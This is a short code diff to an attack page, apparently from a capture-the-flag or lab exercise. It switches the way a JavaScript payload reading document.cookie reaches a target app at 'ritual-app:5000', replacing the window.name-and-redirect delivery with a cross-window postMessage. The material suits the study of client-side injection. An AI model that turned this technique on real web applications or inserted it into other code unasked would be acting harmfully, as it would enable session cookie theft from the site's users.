@@ -1,4 +1,7 @@
 <script>
-window.name = "console.log(document.cookie)";
-location = "http://ritual-app:5000/";
+let w = open("http://ritual-app:5000/");
+
+setTimeout(()=>{
+  w.postMessage("console.log(document.cookie)","*")
+},100);
 </script>
